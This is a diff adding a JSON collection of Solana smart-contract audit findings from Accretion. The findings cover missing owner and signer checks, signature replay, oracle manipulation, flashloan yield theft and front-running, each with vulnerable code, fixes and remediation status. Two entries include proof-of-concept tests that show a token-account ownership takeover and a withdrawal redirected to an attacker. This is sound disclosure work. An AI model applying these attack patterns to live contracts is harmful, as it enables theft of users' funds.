@@ -1,0 +1,599 @@
+{
+  "count": 20,
+  "findings": [
+    {
+      "id": "SS-03699",
+      "version": "1.0.1",
+      "type": "strategy",
+      "title": "`sign_v1` Allows Malicious Instructions on Accounts Without Proper Restrictions",
+      "impact": "HIGH",
+      "tags": [
+        "Access Control",
+        "Arbitrary CPI"
+      ],
+      "category": [
+        "Account Abstraction",
+        "Smart Wallets"
+      ],
+      "protocol": "Swig",
+      "language": "Rust",
+      "content": {
+        "reference": "ACC-C2",
+        "status": "Fixed",
+        "description": "We found that the `sign_v1` instruction does not restrict which instructions can be executed against accounts. This means that a user with limited permissions—such as a `TokenLimit` on a specific mint—can submit malicious instructions that interact with all accounts in ways not covered by their role.\n\n**Example Attack:**\n\nA user with `TokenLimit` permission on mint `[0; 32]` and amount `1` can submit a `SetAuthority` instruction on the token account. Since this operation does not change the token balance, the permission system passes, yet the attacker gains ownership of the token account. Or even the user with no Permission at all could do this because the function only checks for permission if the balance changed.\n\nThis vulnerability extends beyond token accounts. Similar unauthorised actions could be executed on:\n\n• Stake accounts (e.g., transferring authority, modifying lockups) • Any account where the action doesn't affect the balance but modifies control or behaviour.\n\n**POC Summary**\n\nIn this poc, second_authority has TokenLimit permission for token [0;32] and amount 1, but it transfers the token account authority to itself.\n\n```\n#[test_log::test]\nfn test_transfer_tokens_with_mixed_permissions() {\n    let mut context = setup_test_context().unwrap();\n    let swig_authority = Keypair::new();\n    context\n        .svm\n        .airdrop(&swig_authority.pubkey(), 10_000_000_000)\n        .unwrap();\n    let id = rand::random::<[u8; 32]>();\n    let swig = Pubkey::find_program_address(&swig_account_seeds(&id), &program_id()).0;\n    context.svm.warp_to_slot(10);\n    // Setup token infrastructure\n    let mint_pubkey = setup_mint(&mut context.svm, &context.default_payer).unwrap();\n    let swig_ata = setup_ata(\n        &mut context.svm,\n        &mint_pubkey,\n        &swig,\n        &context.default_payer,\n    )\n    .unwrap();\n    mint_to(\n        &mut context.svm,\n        &mint_pubkey,\n        &context.default_payer,\n        &swig_ata,\n        1000,\n    )\n    .unwrap();\n    let swig_create_txn = create_swig_ed25519(&mut context, &swig_authority, id);\n    assert!(swig_create_txn.is_ok());\nlet second_authority = Keypair::new();\ncontext\n    .svm\n    .airdrop(&second_authority.pubkey(), 10_000_000_000)\n    .unwrap();\nadd_authority_with_ed25519_root(\n    &mut context,\n    &swig,\n    &swig_authority,\n    AuthorityConfig {\n        authority_type: AuthorityType::Ed25519,\n        authority: second_authority.pubkey().as_ref(),\n    },\n    vec![ClientAction::TokenLimit(TokenLimit {\n        token_mint: [0; 32],\n        current_amount: 1,\n    })],\n)\n.unwrap();\ncontext.svm.warp_to_slot(100);\nlet token_ix = Instruction {\n    program_id: spl_token::id(),\n    accounts: vec![\n        AccountMeta::new(swig_ata, false),\n        AccountMeta::new(swig, false),\n    ],\n    data: TokenInstruction::SetAuthority {\n        authority_type: spl_token::instruction::AuthorityType::AccountOwner,\n        new_authority: Some(second_authority.pubkey()).into(),\n    }\n    .pack(),\n};\nlet account = context.svm.get_account(&swig_ata).unwrap();\nlet token_account = spl_token::state::Account::unpack(&account.data).unwrap();\nprintln!(\"pk: {} account: {:?}\", swig_ata, token_account);\nlet sign_ix = swig_interface::SignInstruction::new_ed25519(\n    swig,\n    second_authority.pubkey(),\n    second_authority.pubkey(),\n    token_ix,\n    1,\n)\n.unwrap();\nlet transfer_message = v0::Message::try_compile(\n    &second_authority.pubkey(),\n    &[sign_ix],\n    &[],\n    context.svm.latest_blockhash(),\n)\n.unwrap();\nlet transfer_tx =\n    VersionedTransaction::try_new(VersionedMessage::V0(transfer_message), &[&second_authority])\n        .unwrap();\nlet res = context.svm.send_transaction(transfer_tx);\nif res.is_err() {\n    let e = res.unwrap_err();\n    println!(\"Logs {} - {:?}\", e.err, e.meta.logs);\n}\n// assert!(res.is_ok());\nlet swig_token_account = context.svm.get_account(&swig_ata).unwrap();\nlet swig_token_balance = spl_token::state::Account::unpack(&swig_token_account.data).unwrap();\nlet swig_token_account_owner = swig_token_balance.owner;\nassert_eq!(swig_token_account_owner, second_authority.pubkey());\n```\n\n`assert_eq!(swig_token_balance.amount, 1000); }` Logs:\n\n```\n       START             swig::sign test_transfer_tokens_with_mixed_permissions\nrunning 1 test\nprogram_id: swigDk8JezhiAVde8k6NMwxpZfgGm2NNuMe1KYCmUjP\nprogram_id 2: swigSx6DMZmNuTc5u4HxvxNMUBot4DEi6hTtF1TDeU5\npk: HrVLJAtF69L9m5D7iLzNdsEL4o7AXbf5DP2hrb6P4btX account: Account { mint: 43vT8SqNMmr9DZCD6B7Gt5zFWthRvgJm\nDW2eG7hj1uBS, owner: AptALtYGcWfTpr2VcLqMUA8KJNJ3DuBmfx3r2uFM3SPC, amount: 1000, delegate: None, state: In\nitialized, is_native: None, delegated_amount: 0, close_authority: None }\ntest test_transfer_tokens_with_mixed_permissions ... ok\ntest result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 6 filtered out; finished in 0.31s\nPASS [   0.317s] swig::sign test_transfer_tokens_with_mixed_permissions\n```",
+        "location": "https://github.com/anagrambuild/swig-wallet/blob/1887d298e1b8e29bbd19be26de4c352c242fec6b/program/src/actions/sign_v1.rs#L218",
+        "recommendation": "Restrict instruction types and actions per account type. Only allow explicitly approved and verifiable operations based on the assigned role. For example:\n\n• For token accounts: only allow `Transfer` , `Burn` (with limits), etc. ..."
+      },
+      "source": {
+        "audit_firm": "Accretion",
+        "report_name": "https://github.com/accretion-xyz/audit-reports/blob/main/2025-accretion-anagram-swig-audit-A25ANA2.pdf",
+        "date": "2025-07-07"
+      }
+    },
+    {
+      "id": "SS-03703",
+      "version": "1.0.1",
+      "type": "strategy",
+      "title": "`sub_account_sign_v1` and `sign_v1` Passes Session Authorities as Signers During CPI Calls",
+      "impact": "HIGH",
+      "tags": [
+        "CPI Signer Privilege Escalation",
+        "Access Control"
+      ],
+      "category": [
+        "Account Abstraction",
+        "Smart Wallets"
+      ],
+      "protocol": "Swig",
+      "language": "Rust",
+      "content": {
+        "reference": "ACC-H2",
+        "status": "Fixed",
+        "description": "We found that in `sub_account_sign_v1` and `sign_v1`, session-based authorities are not added to the `restricted_keys` list. As a result, these accounts are mistakenly passed as signers in downstream CPI calls, which can unintentionally grant them authority.",
+        "location": "https://github.com/anagrambuild/swig-wallet/blob/1887d298e1b8e29bbd19be26de4c352c242fec6b/program/src/actions/sub_account_sign_v1.rs#L187-L199",
+        "code": "```\nconst UNINIT_KEY: MaybeUninit<&Pubkey> = MaybeUninit::uninit();\n    let mut restricted_keys: [MaybeUninit<&Pubkey>; 2] = [UNINIT_KEY; 2];\n    let rkeys: &[&Pubkey] = unsafe {\n        if role.position.authority_type()? == AuthorityType::Ed25519 {\n            let authority_index = *sign_v1.authority_payload.get_unchecked(0) as usize;\n            restricted_keys[0].write(ctx.accounts.payer.key());\n            restricted_keys[1].write(all_accounts[authority_index].key());\n            core::slice::from_raw_parts(restricted_keys.as_ptr() as _, 2)\n        } else {\n            restricted_keys[0].write(ctx.accounts.payer.key());\n            core::slice::from_raw_parts(restricted_keys.as_ptr() as _, 1)\n        }\n    };\n```",
+        "recommendation": "Update the logic to correctly restrict signers based on the authority type. Only `Secp256k1` doesn't have the authority. All other authority types must include both the payer and the session authority:\n\n```\nlet rkeys: &[&Pubkey] = unsafe {\n    if role.position.authority_type()? == AuthorityType::Secp256k1 {\n        restricted_keys[0].write(ctx.accounts.payer.key());\n        core::slice::from_raw_parts(restricted_keys.as_ptr() as _, 1)\n    } else {\n        let authority_index = *sign_v1.authority_payload.get_unchecked(0) as usize;\n        restricted_keys[0].write(ctx.accounts.payer.key());\n        restricted_keys[1].write(all_accounts[authority_index].key());\n        core::slice::from_raw_parts(restricted_keys.as_ptr() as _, 2)\n    }\n};\n```"
+      },
+      "source": {
+        "audit_firm": "Accretion",
+        "report_name": "https://github.com/accretion-xyz/audit-reports/blob/main/2025-accretion-anagram-swig-audit-A25ANA2.pdf",
+        "date": "2025-07-07"
+      }
+    },
+    {
+      "id": "SS-03706",
+      "version": "1.0.1",
+      "type": "strategy",
+      "title": "`secp256k1` Is Vulnerable to Signature Malleability and Replay Attacks",
+      "impact": "MEDIUM",
+      "tags": [
+        "Signature Replay",
+        "Signature Malleability"
+      ],
+      "category": [
+        "Account Abstraction",
+        "Smart Wallets"
+      ],
+      "protocol": "Swig",
+      "language": "Rust",
+      "content": {
+        "reference": "ACC-M2",
+        "status": "Fixed",
+        "description": "We found that the `secp256k1_authenticate` implementation is vulnerable to two issues:\n\n1. **Replay Attack**: The signature is not enforced to be single-use, allowing the same signature to be reused multiple times for authorization, this could lead to unauthorized repeated operations.\n\n2. **Signature Malleability**: The implementation does not enforce that the `S` value of the signature is in low-order form. This allows alternative valid signatures for the same message, making it possible to modify a signature without invalidating it. This undermines signature uniqueness and opens the door to replay in different contexts or manipulation of signed payloads. See [Solana SDK secp256k1\\_recover - Signature Malleability](https://docs.rs/solchainsaw/latest/sol_chainsaw/solana_sdk/secp256k1_recover/fn.secp256k1_recover.html#signature-malleability) for reference.",
+        "location": "https://github.com/anagrambuild/swig-wallet/blob/1887d298e1b8e29bbd19be26de4c352c242fec6b/state-x/src/authority/secp256k1.rs#L331",
+        "recommendation": "• **Prevent Replay Attacks**: Introduce a mechanism (e.g. nonce tracking, on-chain replay protection) to ensure each signature is accepted only once. • **Prevent Signature Malleability**: Reject signatures where the `S` component is not in low-order",
+        "remediation": "Fixed in pull 33 & 34."
+      },
+      "source": {
+        "audit_firm": "Accretion",
+        "report_name": "https://github.com/accretion-xyz/audit-reports/blob/main/2025-accretion-anagram-swig-audit-A25ANA2.pdf",
+        "date": "2025-07-07"
+      }
+    },
+    {
+      "id": "SS-03756",
+      "version": "1.0.2",
+      "type": "strategy",
+      "title": "Missing ownership check for RegisteredProgram accounts when inserting into queues",
+      "impact": "HIGH",
+      "tags": [
+        "Missing Owner Check",
+        "Access Control"
+      ],
+      "category": [
+        "Infrastructure"
+      ],
+      "protocol": "Light Protocol (Batched Merkle Trees)",
+      "language": "Rust",
+      "content": {
+        "reference": "ACC-C3",
+        "status": "Fixed",
+        "description": "The `insert_into_queues` instruction inserts nullifiers, leaves and addresses into queue accounts. For this, it offers a bool to be set when this instruction is called by a program. In this case, the first given account after the authority is interpreted as a `RegisteredProgram` account. A `RegisteredProgram` account is created by a Group authority, has to also be signed by the Program, and adds a Program to a Group of programs that belong together. From this first account `RegisteredProgram` account, a signer PDA is calculated that belongs to the registered program, and the group authority PDA is read as well. In this process, the owner of the `RegisteredProgram` account however is not checked. This means that those two values can be manipulated and a fake program registration be provided. Later on, all following accounts, such as Merkle Trees and Queues, are checked by confirming that that their owner is the provided `group_authority_pda`, and that the derived signer matches the given signer. In other words, the instruction confirms that we have the correct program signer, and allows this signer to write to any accounts that belong to the Group. Now, because we can fake a program registration, this means an attacker can create a completely new unregistered Program calling this instruction with the correct `PDA_AUTHORITY_PDA_SEED` signature, and a fake `RegisteredProgram` account, which contains itself as the registered program, and a victim Group's `group_authority_pda`. In the malicious call, the attacker Program can now insert arbitrary elements into all queues belonging to the victim Group. This includes nullifiers, leaves and addresses. In practice, this most likely means complete Loss of Funds for all program Groups registered with the protocol.",
+        "location": "https://github.com/Lightprotocol/light-protocol/blob/b9eebe4c6184e170723bf6f063157e07d17378a6/programs/account-compression/src/context.rs#L75-L93",
+        "code": "```\nlet derived_address = match invoked_by_program {\n            true => {\n                let account_info = &account_infos[0];\n                let data = account_info.try_borrow_data()?;\n                if RegisteredProgram::DISCRIMINATOR.as_slice() != &data[..8] {\n                    return Err(AccountError::InvalidDiscriminator.into());\n                }\n                let account = bytemuck::from_bytes::<RegisteredProgram>(&data[8..]);\n                // 1,670 CU\n                // TODO: get from RegisteredProgram account and compare\n                let derived_address = Pubkey::create_program_address(\n                    &[CPI_AUTHORITY_PDA_SEED, &[bump]],\n                    &account.registered_program_id,\n                )?;\n                skip += 1;\n                Some((derived_address, account.group_authority_pda))\n            }\n            false => None,\n        };\n```",
+        "recommendation": "Before checking the Discriminator of `RegisteredProgram` , check that its account ownership.",
+        "remediation": "Fixed in 07b3666f53d8035a1e5877381eae0fc31f48f6b1."
+      },
+      "source": {
+        "audit_firm": "Accretion",
+        "report_name": "https://github.com/accretion-xyz/audit-reports/blob/main/2025-accretion-light-batched-mt-audit-A25LIG2.pdf",
+        "date": "2025-04-04"
+      }
+    },
+    {
+      "id": "SS-03853",
+      "version": "1.0.1",
+      "type": "strategy",
+      "title": "Any `mint_config` can be passed allowing anyone to set metas",
+      "impact": "HIGH",
+      "tags": [
+        "Missing Owner Check",
+        "PDA Seed / Bump Validation"
+      ],
+      "category": [],
+      "protocol": "Solana Token ACL Gate",
+      "language": "Rust",
+      "content": {
+        "reference": "ACC-H1",
+        "status": "Fixed",
+        "description": "The authority for the `SetupExtraMetas` instruction is checked against the `mint_config` account provided.\n\n```\nlet mint_config_data = self.token_acl_mint_config.try_borrow_data()?;\nlet mint_config = token_acl::state::load_mint_config(&mint_config_data)\n.map_err(|_| ABLError::InvalidTokenAclMintConfig)?;\n```\n\nHowever, it is not checked that the ACL program actually created the account or is at the correct address. As a result, an attacker could create an account that has the correct mint/discriminator and himself as the authority, allowing him to change the meta for any mint.",
+        "location": "https://github.com/solana-foundation/token-acl-gate/blob/efc01ab78d633bfb4b792ccb91eb097966a7b87d/program/src/instructions/setup_extra_metas.rs#L67-L69",
+        "recommendation": "We recommend adding checks for ownership and PDA derivation.",
+        "remediation": "Fixed in commit `37255374ecdb7f8588964946c89768178bd7e195` ."
+      },
+      "source": {
+        "audit_firm": "Accretion",
+        "report_name": "https://github.com/accretion-xyz/audit-reports/blob/main/2025-accretion-solana-token-acl-gate-audit-A25SFR4.pdf",
+        "date": "2026-02-10"
+      }
+    },
+    {
+      "id": "SS-03859",
+      "version": "1.0.1",
+      "type": "strategy",
+      "title": "Anyone can close others list and steal rent",
+      "impact": "MEDIUM",
+      "tags": [
+        "Missing Signer Check",
+        "Account Data Mismatch"
+      ],
+      "category": [
+        "Infrastructure"
+      ],
+      "protocol": "Solana Token ACL Gate",
+      "language": "Rust",
+      "content": {
+        "reference": "ACC-M5",
+        "status": "Fixed",
+        "description": "**MEDIUM FIXED**\n\nThe `DeleteList` instruction does not verify that the `authority` is the signer and also does not check that it is the one that created the list.\n\n```\nimpl<'a> TryFrom<&'a [AccountInfo]> for DeleteList<'a> {\n    type Error = ABLError;\n    fn try_from(accounts: &'a [AccountInfo]) -> Result<Self, Self::Error> {\n        let [authority, list_config] = accounts else {\n            return Err(ABLError::NotEnoughAccounts);\n        };\n        if !list_config.is_owned_by(&crate::ID) {\n            return Err(ABLError::InvalidConfigAccount);\n        }\n        Ok(Self {\n            authority,\n            list_config,\n        })\n    }\n}\n```\n\nAs a result, anyone can close any list that currently has no wallets depending on it and steal the actual creators' rent (0.00140592 SOL -> 20c). This could also be used as a DOS by closing another user's lists as soon as they get deployed.",
+        "location": "https://github.com/solana-foundation/token-acl-gate/blob/efc01ab78d633bfb4b792ccb91eb097966a7b87d/program/src/instructions/delete_list.rs#L10-L27",
+        "recommendation": "We recommend adding a check to ensure that `authority` is the signer on deletion.",
+        "remediation": "Fixed in commit `262d5dce7196780eada0a0c5cc476ac2807ec522` ."
+      },
+      "source": {
+        "audit_firm": "Accretion",
+        "report_name": "https://github.com/accretion-xyz/audit-reports/blob/main/2025-accretion-solana-token-acl-gate-audit-A25SFR4.pdf",
+        "date": "2026-02-10"
+      }
+    },
+    {
+      "id": "SS-03928",
+      "version": "1.0.1",
+      "type": "strategy",
+      "title": "Tiny Stake Shares Can Trigger Stake Creation and Revert on Rent",
+      "impact": "HIGH",
+      "tags": [
+        "Rent Exemption",
+        "DoS"
+      ],
+      "category": [],
+      "protocol": "RevTec V2",
+      "language": "Rust",
+      "content": {
+        "reference": "ACC-H1",
+        "status": "Fixed",
+        "description": "We found that during stake distribution, the program calculates each validator’s share and creates a stake account if share > 0. If the share is positive but smaller than MINIMUM_STAKE_BALANCE, the flow still enters the create/merge stake branch. In this case, the share cannot cover the minimum rent/required balance, so the transaction can revert, if we couldn't distribute to the target amount (validator_count) the stake distribution logic will stuck.",
+        "location": "https://github.com/H2O-Nodes-GmbH/RevTec/blob/85315821731c365ad8c08ba5700f07cd2e199e33/contracts-v2/programs/contracts-v2/src/instructions/crank/distribute_stake.rs#L193-L195",
+        "code": "```\n// Handle zero-share case: validator's allocation rounds to 0 lamports\n    // Still mark as distributed to prevent close_stake_distributor deadlock\n    if share == 0 {\n```",
+        "recommendation": "Only create/merge a stake account when share >= MINIMUM_STAKE_BALANCE (not just > 0).",
+        "remediation": "Fixed in https://github.com/H2O-Nodes-GmbH/RevTec/commit/8f83b660de651dc18b56a455d937ea1a19ff91fa."
+      },
+      "source": {
+        "audit_firm": "Accretion",
+        "report_name": "https://github.com/accretion-xyz/audit-reports/blob/main/2026-accretion-h2o-nodes-gmbh-revtec-audit-A26HTO1.pdf",
+        "date": "2026-04-01"
+      }
+    },
+    {
+      "id": "SS-03926",
+      "version": "1.0.1",
+      "type": "strategy",
+      "title": "Lack of fees allow flashloan yield-stealing attack",
+      "impact": "HIGH",
+      "tags": [
+        "Reward Accounting"
+      ],
+      "category": [
+        "Liquid Staking",
+        "Staking Pool"
+      ],
+      "protocol": "RevTec V2",
+      "language": "Rust",
+      "content": {
+        "reference": "ACC-C1",
+        "status": "Fixed",
+        "description": "We found that the lack of deposit/withdraw fees allow an attacker to deposit funds whenever rev or iss has accumulated hasn't been processed yet, call the processing functions, and then immediately withdraw again, earning a yield without contributing to the yield (their funds were never staked). Together with a flashloan, an attacker could steal most of the generated yield for themselves.",
+        "location": "https://github.com/H2O-Nodes-GmbH/RevTec/blob/85315821731c365ad8c08ba5700f07cd2e199e33/contracts-v2/programs/contracts-v2/src/instructions/user/deposit.rs#L125-L125",
+        "recommendation": "A simple fix could be a fee charged on deposits or withdraws. We could also make rev/iss processing an admin instruction, but it could still be vulnerable to sandwiching. We could also move yield processing, or add checks on deposits that there is no unprocessed yield.",
+        "remediation": "Fixed in https://github.com/H2O-Nodes-GmbH/RevTec/commit/c13047ffbbed9b037e8c98656fbd6a8f76cb68e3"
+      },
+      "source": {
+        "audit_firm": "Accretion",
+        "report_name": "https://github.com/accretion-xyz/audit-reports/blob/main/2026-accretion-h2o-nodes-gmbh-revtec-audit-A26HTO1.pdf",
+        "date": "2026-04-01"
+      }
+    },
+    {
+      "id": "SS-03911",
+      "version": "1.0.1",
+      "type": "strategy",
+      "title": "Address Lookup Table Never Verified",
+      "impact": "MEDIUM",
+      "tags": [
+        "Missing Owner Check",
+        "Account Type Confusion"
+      ],
+      "category": [],
+      "protocol": "Exponent Tranching",
+      "language": "Rust",
+      "content": {
+        "reference": "ACC-M5",
+        "status": "Fixed",
+        "description": "We found that the Address Lookup Table assigned on market creation is never verified to actually belong to the ALT program. A malicious market could use a fake table with modifiable entries.",
+        "location": "https://github.com/exponent-finance/exponent-monorepo/blob/ebae3437ce0056d89d2cb01725759da1c0f79994/solana/programs/exponent_tranching/src/instructions/admin/initialize_tranching_market.rs#L183-L184",
+        "code": "```\n/// initialize_tranching_market.rs L183-L184\n    ctx.accounts.market.set_inner(ExponentTranchingMarket {\n        address_lookup_table: ctx.accounts.address_lookup_table.key(),\n```",
+        "recommendation": "Verify the ALT when it is assigned to a market.",
+        "remediation": "Remediated in https://github.com/exponent-finance/exponent-monorepo/pull/3924"
+      },
+      "source": {
+        "audit_firm": "Accretion",
+        "report_name": "https://github.com/accretion-xyz/audit-reports/blob/main/2026-accretion-exponent-finance-exponent-tranching-audit-A26EXP1.pdf",
+        "date": "2026-05-27"
+      }
+    },
+    {
+      "id": "SS-03738",
+      "version": "1.0.2",
+      "type": "strategy",
+      "title": "Non-Canonical Price Feeds Allow Historical Price Manipulation",
+      "impact": "HIGH",
+      "tags": [
+        "Oracle Manipulation",
+        "Stale / Invalid Oracle Price",
+        "Account Data Mismatch"
+      ],
+      "category": [
+        "Decentralized Stablecoin",
+        "Oracles"
+      ],
+      "protocol": "Hylo",
+      "language": "Rust",
+      "content": {
+        "reference": "ACC-H1",
+        "status": "Fixed",
+        "description": "We found that the protocol does **not enforce canonical accounts** for `sol_usd_pyth_feed` . Any account with the same `feed ID` can be submitted, allowing anyone to create a `PriceUpdateV2` account and publish historical prices. For example, with a 5-minute age window:\n\n- Transaction 1 uses price `t2` (latest).\n\n- Transaction 2 uses price `t1` (older, t1 < t2) from a custom account.\n\nWhile the protocol correctly validates publish and update times, this issue allows users to submit historical valid prices within the allowed time window (which was configured to be 60s), potentially manipulating outcomes.",
+        "location": "https://github.com/hylo-so/protocol/blob/2381c3602dae7bc0be1e2576d2824dd69fab2ba9/programs/hylo-exchange/src/instructions/mint_levercoin.rs#L106-L109",
+        "code": "```\n#[account(\n    constraint = sol_usd_pyth_feed.price_message.feed_id == SOL_USD,\n  )]\npub sol_usd_pyth_feed: Account<'info, PriceUpdateV2>,\n```",
+        "recommendation": "- Use a **canonical feed account** managed and sponsored by Pyth.\n\n- Alternatively, use a **personal, persistent account** that you control and update yourself.",
+        "remediation": "Fixed in commit `38e0c79d00de5b67427cc8d9fe64cdd12e98f60c` ."
+      },
+      "source": {
+        "audit_firm": "Accretion",
+        "report_name": "https://github.com/accretion-xyz/audit-reports/blob/main/2025-accretion-hylo-hylo-audit-A25HYL1.pdf",
+        "date": "2025-12-08"
+      }
+    },
+    {
+      "id": "SS-03740",
+      "version": "1.0.2",
+      "type": "strategy",
+      "title": "Swap Instruction Lacks Slippage Protection",
+      "impact": "MEDIUM",
+      "tags": [
+        "Missing Slippage Protection"
+      ],
+      "category": [
+        "Decentralized Stablecoin",
+        "Synthetics"
+      ],
+      "protocol": "Hylo",
+      "language": "Rust",
+      "content": {
+        "reference": "ACC-M2",
+        "status": "Fixed",
+        "description": "We found that the **swap instruction** depends on several invariants to calculate fair exchange rates:\n\n- Current oracle prices ( `sol_usd_pyth_feed` )\n\n- Current token supplies ( `levercoin_mint.supply` )\n\n- Current protocol state (e.g., total SOL, collateral ratio)\n\nThis makes it **vulnerable to frontrunning attacks** . Currently, there is **no slippage protection mechanism** to guard against this.",
+        "location": "https://github.com/hylo-so/protocol/blob/main/programs/hylo-exchange/src/instructions/swap.rs",
+        "recommendation": "Add a **slippage check** to the swap instruction so that the user specifies a minimum acceptable output. If the actual result falls below this bound, the transaction should revert.",
+        "remediation": "Fixed in commit `f70f4643d4c44949e4d6b314e30989d812f7d97a` ."
+      },
+      "source": {
+        "audit_firm": "Accretion",
+        "report_name": "https://github.com/accretion-xyz/audit-reports/blob/main/2025-accretion-hylo-hylo-audit-A25HYL1.pdf",
+        "date": "2025-12-08"
+      }
+    },
+    {
+      "id": "SS-03813",
+      "version": "1.0.1",
+      "type": "strategy",
+      "title": "Missing Recipient Validation in Withdraw Allows Front-Running and Fund Theft",
+      "impact": "HIGH",
+      "tags": [
+        "Account Data Mismatch",
+        "Front-running",
+        "Input Validation"
+      ],
+      "category": [
+        "Privacy / Confidential Compute",
+        "Infrastructure"
+      ],
+      "protocol": "Privacy Cash",
+      "language": "Rust",
+      "content": {
+        "reference": "ACC-C2",
+        "status": "Fixed",
+        "description": "We found that during the withdraw process, the recipient account is not validated against `ExtData::recipient` . This allows an attacker to front-run a legitimate transaction and replace the recipient with their own address to steal funds.\n\n• **Test:**\n\n```\n@@ -75,6 +75,7 @@ describe(\"zkcash\", () => {\n   let recipient: anchor.web3.Keypair;\n   let fundingAccount: anchor.web3.Keypair;\n   let randomUser: anchor.web3.Keypair; // Random user for signing transactions\n+  let attacker: anchor.web3.Keypair; // Random user for signing transactions\n   // Initialize variables for tree token account\n   let treeTokenAccountPDA: PublicKey;\n@@ -186,10 +187,10 @@ describe(\"zkcash\", () => {\n         lastValidBlockHeight: latestBlockHash2.lastValidBlockHeight,\n         signature: treeTokenAirdropSignature,\n       });\n       // Generate a random user for signing transactions\n       randomUser = anchor.web3.Keypair.generate();\n+     attacker = anchor.web3.Keypair.generate();\n       // Fund the random user with SOL\n       const randomUserAirdropSignature = await provider.connection.requestAirdrop(randomUser.publicKey, 1 *\nLAMPORTS_PER_SOL);\n       const latestBlockHash4 = await provider.connection.getLatestBlockhash();\n@@ -198,7 +199,14 @@ describe(\"zkcash\", () => {\n         lastValidBlockHeight: latestBlockHash4.lastValidBlockHeight,\n         signature: randomUserAirdropSignature,\n       });\n+      const attackerAirdropSignature = await provider.connection.requestAirdrop(attacker.publicKey, 1 * LAMP\nORTS_PER_SOL);\n+      await provider.connection.confirmTransaction({\n+        blockhash: latestBlockHash4.blockhash,\n+        lastValidBlockHeight: latestBlockHash4.lastValidBlockHeight,\n+        signature: attackerAirdropSignature,\n+      });\n```\n\nchange the `Can execute both deposit and withdraw instruction for correct input, with 0 fee` test with following:\n\n```\n// Create Address Lookup Table for transaction size optimization\nconst testProtocolAddresses = getTestProtocolAddresses(\n  program.programId,\n  authority.publicKey,\n  treeAccountPDA,\n  treeTokenAccountPDA,\n  nullifier0PDA,\n  nullifier1PDA,\n  commitment0PDA,\n  commitment1PDA,\n  recipient.publicKey,\n  feeRecipient.publicKey,\n      randomUser.publicKey,\n    );\n+    testProtocolAddresses.push(attacker.publicKey); // Add attacker to the lookup table\n    const lookupTableAddress = await createGlobalTestALT(provider.connection, authority, testProtocolAddresse\ns);\n   .\n    // Get balances after transaction\n    const treeTokenAccountBalanceAfter = await provider.connection.getBalance(treeTokenAccountPDA);\n    const feeRecipientBalanceAfter = await provider.connection.getBalance(feeRecipient.publicKey);\n    const recipientBalanceAfter = await provider.connection.getBalance(recipient.publicKey);\n    const randomUserBalanceAfter = await provider.connection.getBalance(randomUser.publicKey);\n+    const attackerBalanceBefore = await provider.connection.getBalance(attacker.publicKey);\n   .\n    // Execute the withdrawal transaction\n    const withdrawTx = await program.methods\n      .transact(withdrawProofToSubmit, withdrawExtData)\n      .accounts({\n        treeAccount: treeAccountPDA,\n        nullifier0: withdrawNullifiers.nullifier0PDA,\n        nullifier1: withdrawNullifiers.nullifier1PDA,\n        commitment0: withdrawCommitments.commitment0PDA,\n        commitment1: withdrawCommitments.commitment1PDA,\n+       recipient: attacker.publicKey,\n        feeRecipientAccount: feeRecipient.publicKey,\n        treeTokenAccount: treeTokenAccountPDA,\n        authority: authority.publicKey,\n        signer: randomUser.publicKey,\n        systemProgram: anchor.web3.SystemProgram.programId\n      })\n      .signers([randomUser])\n      .preInstructions([modifyComputeUnits])\n      .transaction();\n   .\n    // Get final balances after both transactions\n    const finalTreeTokenBalance = await provider.connection.getBalance(treeTokenAccountPDA);\n    const finalFeeRecipientBalance = await provider.connection.getBalance(feeRecipient.publicKey);\n    const finalRandomUserBalance = await provider.connection.getBalance(randomUser.publicKey);\n+    const finalAttackerBalance = await provider.connection.getBalance(attacker.publicKey);\n    // Calculate the withdrawal diffs specifically\n    const treeTokenWithdrawDiff = finalTreeTokenBalance - treeTokenAccountBalanceAfter;\n    const feeRecipientWithdrawDiff = finalFeeRecipientBalance - feeRecipientBalanceAfter;\n    const randomUserWithdrawDiff = finalRandomUserBalance - randomUserBalanceAfter;\n+    const attackerWithdrawDiff = finalAttackerBalance - attackerBalanceBefore;\n    // Verify withdrawal logic worked correctly\n    expect(treeTokenWithdrawDiff).to.be.equals(extAmount.toNumber() - withdrawFee.toNumber()); // Tree decrea\nses by withdraw amount\n    expect(feeRecipientWithdrawDiff).to.be.equals(withdrawFee.toNumber()); // Fee recipient unchanged\n    expect(randomUserWithdrawDiff).to.be.lessThan(-extAmount.toNumber()); // User gets withdraw amount minus\ntx fee\n+    // Attacker gets the full amount\n+    expect(attackerWithdrawDiff).to.be.equals(-extAmount.toNumber());\n    // Calculate overall diffs for the full cycle\n    const treeTokenTotalDiff = finalTreeTokenBalance - treeTokenAccountBalanceBefore;\n    const feeRecipientTotalDiff = finalFeeRecipientBalance - feeRecipientBalanceBefore;\n    const randomUserTotalDiff = finalRandomUserBalance - randomUserBalanceBefore;\n```",
+        "location": "https://github.com/SocialfiPanda/privacy-cash/blob/e6070e6418a723dc8ee141de75e10580d1c7ebbb/anchor/programs/zkcash/src/lib.rs#L273-L274",
+        "code": "```\n#[account(mut)]\n    pub recipient: SystemAccount<'info>,\n```",
+        "recommendation": "Ensure the recipient account in the transaction matches the `ExtData::recipient` value before processing the withdrawal.",
+        "remediation": "Fixed in commit 62c47f5ba56be309cffede2d4617345c7c1fd94a."
+      },
+      "source": {
+        "audit_firm": "Accretion",
+        "report_name": "https://github.com/accretion-xyz/audit-reports/blob/main/2025-accretion-privacy-cash-audit-A25PRC1.pdf",
+        "date": "2025-08-18"
+      }
+    },
+    {
+      "id": "SS-03812",
+      "version": "1.0.1",
+      "type": "strategy",
+      "title": "Tree authority can lock funds in the tree",
+      "impact": "HIGH",
+      "tags": [
+        "DoS",
+        "Centralization Risk",
+        "Misconfiguration"
+      ],
+      "category": [
+        "Privacy / Confidential Compute",
+        "Infrastructure"
+      ],
+      "protocol": "Privacy Cash",
+      "language": "Rust",
+      "content": {
+        "reference": "ACC-C1",
+        "status": "Fixed",
+        "description": "We found that the authority of a tree can prevent users for transacting with it at any point, potentially holding user funds hostage. This is because when users want to interact with the program, they use the `Transact` instruction. It takes the `authority` account as an input with a constraint that this account is a `SystemAccount`. This means, when the `authority` account stops being a `SystemAccount`, no one can call the `Transact` instruction. In practice, this means that a malicious authority can create a tree, wait for any users to deposit funds, and then at some point change their own `authority` account owner to any other program, maybe in a way that they can revert this action. Now all deposited funds are trapped in the program until this authority changes the account owner back to `System`.",
+        "location": "https://github.com/SocialfiPanda/privacy-cash/blob/61120f943dbd1b44ecbb522e791f3632f72a26ff/anchor/programs/zkcash/src/lib.rs#L280-L280",
